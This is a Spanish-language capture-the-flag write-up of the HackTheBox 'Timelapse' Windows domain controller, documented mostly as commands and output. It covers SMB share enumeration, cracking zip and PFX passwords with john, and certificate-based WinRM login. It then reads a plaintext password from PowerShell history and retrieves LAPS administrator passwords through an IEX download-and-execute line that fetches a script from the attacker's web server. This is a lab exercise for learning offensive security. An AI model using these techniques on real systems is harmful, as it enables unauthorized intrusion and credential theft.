---
title: Timelapse Writeup - HackTheBox
date: 2023-07-26
categories: [Writeups, HTB]
tags: [Windows, HTB, CTF, Easy, SMB, Cracking ZIP, PFX File, WinRM, Powershell history, LAPS]
img_path: /assets/img/commons/timelapse/
image: timelapse.png
---

¡Saludos!

En este informe, nos adentraremos en la máquina [**Timelapse**](https://app.hackthebox.com/machines/452) de **HackTheBox**, la cual está clasificada con un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Windows** en la que realizaremos una **enumeración SMB** para obtener un **archivo zip** protegido con contraseña que deberemos descifrar para recuperar un **archivo PFX**, permitiéndonos así el acceso al sistema a través de **WinRM**. Una vez que hayamos obtenido acceso al sistema, llevaremos a cabo un pivoting hacia un usuario que forma parte del grupo **LAPS_Readers**, lo que nos facilitará la obtención de la contraseña del usuario Administrador.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.11.152
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=107 ms

--- 10.10.11.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.612/106.612/106.612/0.000 ms
```

Dado que el `TTL` es cercano a `128`, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.11.152 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-26 22:33 -05
Nmap scan report for 10.10.11.152
Host is up (0.12s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49695/tcp open  unknown
54225/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,54225 -sV -sC --min-rate 5000 10.10.11.152 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-26 22:38 -05
Nmap scan report for 10.10.11.152
Host is up (0.11s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-27 11:38:14Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-07-27T11:39:45+00:00; +7h59m57s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
54225/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-27T11:39:08
|_  start_date: N/A
|_clock-skew: mean: 7h59m56s, deviation: 0s, median: 7h59m56s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.59 seconds
```

El reporte de `Nmap` muestra varios puertos comunes de **Active Directory** abiertos en el host con nombre `DC01` y perteneciente al dominio `timelapse.htb`.

### SMB - 139/445

Al detectar que `SMB` está abierto, procedimos a verificar si era posible acceder de manera anónima a algún recurso compartido.

Utilizamos el siguiente comando para listar los recursos compartidos `SMB` disponibles:

```bash
❯ smbmap -H 10.10.11.152 -u 'guest'
[+] IP: 10.10.11.152:445	Name: 10.10.11.152                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
```

La salida anterior revela que existe un recurso compartido denominado `Shares` al cual tenemos permisos de lectura.

```bash
❯ smbclient //10.10.11.152/Shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 2449933 blocks available
smb: \> cd Dev\
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 2449933 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (6,0 KiloBytes/sec) (average 6,0 KiloBytes/sec)
```

Encontramos dos carpetas: `Dev` y `HelpDesk`. En la carpeta `Dev`, hallamos un archivo `zip` llamado `winrm_backup.zip`. Intentamos descomprimirlo, pero requerimos una contraseña que no poseemos actualmente.

```bash
❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

Intentamos descifrar la contraseña utilizando la herramienta `John`. Para ello, primero utilizamos la utilidad `zip2john` para convertir el archivo `zip` a un formato hash.

```bash
❯ zip2john winrm_backup.zip > hash_zip
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-07-26 23:08) 1.010g/s 3508Kp/s 3508Kc/s 3508KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

El resultado es un archivo `PFX` que contiene un certificado `SSL` en formato **PKCS#12** y una clave privada.

```bash
❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

## Explotación

---

El certificado y la clave privada permiten iniciar sesión sin contraseña en `WinRM`. A continuación, intentaremos extraerlos del archivo.

El primer paso será extraer la clave privada del archivo `PFX`, el cual estará encriptado, para ello ingresa el siguiente comando:

```bash
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out file-priv.key
Enter Import Password:
```

La salida anterior indica que necesitamos una contraseña diferente a `supremelegacy`. Para proceder, utilizamos la utilidad `pfx2john` para convertir el archivo `PFX` en un formato hash, y luego empleamos `John` para descifrar la contraseña.

```bash
❯ pfx2john legacyy_dev_auth.pfx > hash_pfx
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash_pfx
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:42 DONE (2023-07-26 23:25) 0.02375g/s 76781p/s 76781c/s 76781C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Una vez descifrada la contraseña, extraemos el certificado `SSL` y la clave privada del archivo `PFX` usando los siguientes comandos.

```bash
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
Enter Import Password:
```

Una vez que hemos desencriptado el archivo `PFX` y generado un certificado y clave válidos, podemos intentar iniciar sesión a través de `WinRM`. En la salida de nuestro comando `Nmap`, podemos ver que el puerto 5986 está abierto, el cual se utiliza comúnmente por `WinRM` con conexiones `SSL` encriptadas. Dado que `Evil-WinRM` nos permite pasar una clave y un certificado utilizando las opciones `-c` y `-k`, podemos utilizarlos para autenticarnos en el objetivo.

```bash
❯ evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

Una vez conectados como usuario `legacyy`, procedemos a obtener la user flag en la ruta `C:\Users\legacyy\Desktop`.

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir

    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/27/2023   7:46 AM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
f4ccb23a73f74b0f****************
```

## Escalación de privilegios

---

Realizamos una enumeración manual para ver si podemos escalar nuestros privilegios. Encontramos el usuario `svc_deploy` del dominio que forma parte del grupo `LAPS_Readers`.

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

El "**Local Administrator Password Solution**" (`LAPS`) se utiliza para gestionar las contraseñas de las cuentas locales de los equipos Active Directory. Por lo tanto, sería interesante encontrar una forma de autenticarnos como usuario `svc_deploy` y recuperar estas contraseñas. 

### User Pivoting

Afortunadamente, al inspeccionar el historial de la línea de comandos de PowerShell, hemos encontrado la contraseña del usuario `svc_deploy`.

```bash
*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Verificamos con `crackmapexec` si las credenciales son válidas.

```bash
❯ crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

Al ser válidas, podemos iniciar sesión a través de `Evil-WinRM` utilizando el siguiente comando:

```bash
❯ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

Existe un script de PowerShell en GitHub llamado https://github.com/kfosaaen/Get-LAPSPasswords, que permite recuperar las contraseñas de `LAPS`.

Alojamos el archivo `Get-LAPSPasswords.ps1` en un servidor web utilizando Python para luego descargarlo en la máquina víctima.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Con el siguiente comando, descargamos y ejecutamos el script `Get-LAPSPasswords.ps1`:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.148/Get-LAPSPasswords.ps1')
```

Luego, ejecutamos la función `Get-LAPSPasswords` para obtener las contraseñas de las cuentas de administrador local generadas por `LAPS`.

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 7]pZ-rLF480%v;mABF$j;a53
Expiration : 8/1/2023 7:46:35 AM

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 7]pZ-rLF480%v;mABF$j;a53
Expiration : 8/1/2023 7:46:35 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 7]pZ-rLF480%v;mABF$j;a53
Expiration : 8/1/2023 7:46:35 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 7]pZ-rLF480%v;mABF$j;a53
Expiration : 8/1/2023 7:46:35 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA
```

Con la contraseña en nuestro poder, procedemos a verificar si son válidas para el usuario `Administrator`.

```bash
❯ crackmapexec smb 10.10.11.152 -u 'Administrator' -p '7]pZ-rLF480%v;mABF$j;a53'
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\Administrator:7]pZ-rLF480%v;mABF$j;a53 (Pwn3d!)
```

Al ser válidas, podemos iniciar sesión con `Evil-WinRM` como usuario `Administrator`.

```bash
❯ evil-winrm -i 10.10.11.152 -u 'Administrator' -p '7]pZ-rLF480%v;mABF$j;a53' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

Finalmente, obtenemos la root flag en la ruta `C:\Users\TRX\Desktop`.

```bash
*Evil-WinRM* PS C:\Users\TRX\Desktop> dir

    Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/27/2023   7:46 AM             34 root.txt

*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
f5577c7b4e1e9fe5****************
```

!Happy Hacking¡
